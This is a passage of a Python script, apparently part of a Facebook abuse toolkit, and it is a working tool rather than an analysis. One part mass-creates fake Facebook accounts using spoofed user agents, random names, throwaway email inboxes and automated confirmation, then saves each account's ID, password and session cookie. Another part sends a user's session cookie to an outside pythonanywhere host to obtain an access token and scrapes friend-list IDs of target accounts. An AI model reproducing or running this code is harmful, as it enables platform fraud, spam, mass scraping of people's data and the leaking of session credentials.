    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)

def cvt(st,ran):
    try:
        if st == 'ok': cookie = ('c_user=%s;xs=%s;fr=%s;datr=%s;'%(ran['c_user'],ran['xs'],ran['fr'],ran['datr']))
        elif st == 'cp': cookie = ('checkpoint=%s;datr=%s;fr=%s;'%(ran['checkpoint'],ran['datr'],ran['fr']))
    except Exception as e : cookie = '; '.join([str(x)+"="+str(y) for x,y in ran])
    return(str(cookie))
def a(k):return k
import os,time,_md5,marshal,inspect
if str(os.system)==str():
  exit()
  sys.exit()
  os._exit(0)

def random_ua():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)

def Create():

    import requests as r,re,random,os
    from bs4 import BeautifulSoup
    print()
    def rnd(a,b):
      return str(random.randint(a,b))
    def find(txtt,wrd):
       xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
       return xx
    m=['Aijaz|Ali', 'Zulfiqar|Ali', 'Kamran|Wassan', 'Shoaib|Shoaib', 'Muhbbat|Wassan', 'Rana|Waseem', 'Paras|Paras', 'Rana|Mohsin', 'Aliali|Aliali', 'Ali|Ali', 'Ghulam|Ghulam', 'Waqar|Lakho', 'Junaid|Chandia', 'Malik|Fiaz']
    def process(pas,mmail):
        global ok
        import requests,re
        requests=requests.Session()
        cookies=None
        def find(txtt,wrd):
               xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
               return xx
        import requests,re,random
        requests=requests.Session()
        cookies=None
        ua=random_ua()
        from fake_email import Email
        mmail=Email().Mail()
        def rnd(a,b):
            return str(random.randint(a,b))
        em=mmail['mail']
        num="03"+rnd(10,49)+rnd(1111111,9999999)
        headers1 = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        url1 = 'https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk'
        data1 = None
        response1 = requests.get(url1, headers=headers1, data=data1)    
        headers2 = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB, en;q=0.9, en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        url2 = 'https://mbasic.facebook.com/reg/submit/'
        data2 = {
            'lsd': find(response1.text,"lsd"),
            'jazoest': find(response1.text,"jazoest"),
            'ccp': '2',
            'reg_instance': find(response1.text,"reg_instance"),
            'reg_impression_id': find(response1.text,"reg_impression_id"),
            'ns': '0',
            'app_id': find(response1.text,"app_id"),
            'logger_id': find(response1.text,"logger_id"),
            'suma_create_event': 'suma_redirection_click_create_account',
            'field_names[0]': 'firstname',
            'field_names[1]': 'birthday_wrapper',
            'field_names[2]': 'reg_email__',
            'field_names[3]': 'sex',
            'field_names[4]': 'reg_passwd__',
            'is_birthday_confirmed': 'confirmed',
            'multi_step_form': '1',
            'skip_suma': '0',
            'shouldForceMTouch': '1',
            'ref': 'dbl',
            'firstname': random.choice(m).split("|")[0]+" "+random.choice(m).split("|")[1],
            'reg_email__': num,
            'sex': '1',
            'reg_passwd__':pas,
            'birthday_day': rnd(10,27),
            'birthday_month': '3',
            'birthday_year': rnd(1978,1999),
            'welcome_step_completed': True,
            'submission_request': True,
            'age_step_input': False,
            'did_use_age': False,
            'custom_gender': False,
            'name_suggest_elig': False,
            'was_shown_name_suggestions': False,
            'did_use_suggested_name': False,
            'use_custom_gender': False,
            'zero_header_af_client': '',
            'helper': '',
            'guid': '',
            'pre_form_step': '',
            'korean_tos_is_present': '',
            'checkbox_privacy_policy': '',
            'checkbox_tos': '',
            'checkbox_location_policy': ''}
        response = requests.post(url2, headers=headers2, data=data2)
        response=requests.get("https://mbasic.facebook.com")
        if "checkpoint" in response.text:
            return "chk"
        headers = {
        'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
        'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '21',
        'upgrade-insecure-requests': '1',
        'user-agent': random_ua()}
        for i in  re.findall('href="/changeemail(.*?)"',response.text):
          url="/changeemail"+i
        response = requests.get("https://mbasic.facebook.com"+url, headers=headers)
        headers = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        data = {
            'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(response.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),
            'old_email': re.search('name="old_email" value="(.*?)"',str(response.text)).group(1),
            'reg_instance': re.search('name="reg_instance" value="(.*?)"',str(response.text)).group(1),
            'new': em,
            'next': '',
            'submit': 'Add'}
        url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text)[0]
        submit = requests.post(url, headers=headers, data=data)
        r=requests.get("https://mbasic.facebook.com")
        while True:
            h=Email(mmail["session"]).inbox()
            if h:
                j = h['topic'].split('-')[1];hh = j.split(' ')[0]
                cd = hh
                break
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not;A-Brand";v="99","Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not;A-Brand";v="99.0.0.0","Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-ch-ua-platform-version': '11.0.0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': random_ua()}
        data = {'contact': em,
            'type': 'submit',
            'is_soft_cliff': False,
            'medium': 'email',
            'code': cd,
            'fb_dtsg': find(r.text,"fb_dtsg"),
            'jazoest': find(r.text,"jazoest"),
            '__user': dict(requests.cookies)['c_user']}
        url = 'https://m.facebook.com/confirmation_cliff/'
        response = requests.post(url, headers=headers, data=data)
        return requests

    def strt():
       try:
           global ok,loop,cp,ok1
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m generating account %s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           hd = {'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/reg', 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent':random_ua()}
           if "9":
              pas=random.choice(m).replace('|','').lower()+rnd(1111,9999)
              requests=process(pas,mmail)
              if requests=="chk":
                cp+=1
                pass
              elif requests=="0":pass
              else:
                 dc=dict(requests.cookies)
                 cok=";".join([k+"="+v for k,v in dc.items()])
                 uid=re.findall("c_user=(.*?);",cok)[0]
                 coki = cvt('ok',requests.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
                 print("\r\r\033[1;32m [MUGHAL-OK] "+uid+'|'+pas+'|'+coki)
                 ok+=1
                 open(file,"a").write(uid+"|"+pas+"|"+coki+"\n")
                 linex()
       except Exception as e:
           if not "urllib" and not "perma" in str(e):print(e)
           pass
    clear()
    u=5000
    for i in range(50000):
       import time
       time.sleep(2)
       tpe(max_workers=10).submit(strt)

import requests
import os
import time
import sys
total =[]
def sep_and_save(sav,sep):
    clear()
    os.system('touch /sdcard/123.txt')
    try:
        for choice_ids in sep:
            os.system('cat '+sav+' | grep "'+choice_ids+'" >> /sdcard/123.txt')
            os.system('sort -r /sdcard/123.txt | uniq > '+sav+'')
            os.system('rm -rf /sdcard/123.txt')
    except:pass
def files():
    clear()
    try:
        token= open ('token_eaa.txt','r',encoding='utf-8').read()
    except FileNotFoundError:
        login_cookie()
    print (" Unlimited File Create \n Separate Links Files \n Duplicate Links Remove \n Remove cookie");line()
    a = input(" Choose :")
    if a == "1":
        dump(token)
    elif a == "2":
        seprate()
    elif a == "3":
        duplicate()
    elif a == "0":
      os.system("rm -rf token_eaa.txt");main()
def dump(token):
    clear()
    global total
    ids_list = []
    os.system('rm -rf .a.txt')
    try:
        limit = int(input(' How many ids you dump : '));line()
    except:
        limit = 3
    for n in range(limit):
        ids_list.append(input(f' Put uid {n+1} : '))
    line()
    sav = input(' Save File Name : ')
    line()
    for id in ids_list:
        json_prams = {
            'uid':id,
            'token':token,}
        posted = requests.get('https://dilutecodes.pythonanywhere.com//file-create',json=json_prams).json()
        try:
            status,data = posted['status'],posted['data']
            for accounts in data:
                node2 = accounts['node']
                imuid = node2['id']
                open('.a.txt', 'a', encoding='utf-8').write(imuid + '\n')
                idss = len(open('.a.txt','r').readlines())
        except Exception as e:
            status = posted['status'],posted['message']
    file = open('/sdcard/.a.txt', 'r').read().splitlines()
    print(' Dumping process Starting wait ')
    line()
    for uid in file:
        json_data2 = {
            'uid':uid,
            'token': token,}
        sys.stdout.write(f'\r \033[1;37m[Total : \033[1;32m{len(total)}\033[1;37m] ')
        sys.stdout.flush()
        posted = requests.get('https://dilutecodes.pythonanywhere.com//file-create',json=json_data2).json()
        try:
            status,data = posted['status'],posted['data']
            for accounts in data:
                node2 = accounts['node']
                open(sav, 'a', encoding='utf-8').write(node2['id'] + "|" + node2['name'] + '\n')
                total.append(str(node2['id']))
            print(f'\r Sucessfully Extracted : {uid} ')
        except Exception as e:
            status = posted['status'],posted['message']

def login_cookie():
    clear()
    cok = input('\033[1;97m Put Cookies : ')
    line()
    json_data = {'cookie':cok}
    r = requests.get('https://dilutecodes.pythonanywhere.com//login-cookiev2',json=json_data).json()
    try:
        status,token = r['status'],r['token']
        if status == 'success':
            print('\033[1;92m Login Successfull \033[1;97m')
            open ('token_eaa.txt','w',encoding='utf-8').write(str(token))
            time.sleep(2)
            files()
        else:
            print(' cookies checkpoint')
            print(r)
    except Exception as e:
        print(e)

def seprate():
    os.system('clear');clear()
    try:
        limit = int(input(' How many links you separate ? '));line()
    except:
        limit = 1
    file_name = input(' Enter File Name: ');line()
    new_save = input(' Save new file name : ');line()
    print(f" Separate Link Ex : 6155, 10001");line()
    for k in range(limit):
        links=input(' Put Uid : ')
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    line()
    print(f' Successfully Separate Links')
    print(' Total ids : \033[1;32m'+str(len(open(new_save).read().splitlines())))
    print(' New file saved as : '+new_save)
    line()
    input(' Press enter to back  ')

def duplicate():
    os.system('clear');clear()
    file_path = input(" Enter File Name : ")
    with open(file_path, "r") as file:
        lines = file.readlines()
    with open(file_path, "w") as file:
        file.writelines(set(lines))
    line()
    print(" Sucessfully Removed Done !\033[0m")
    print(f" Saved in {file_path} \033[0m")
    line()
    input(" Press enter to go back ")

Activate()
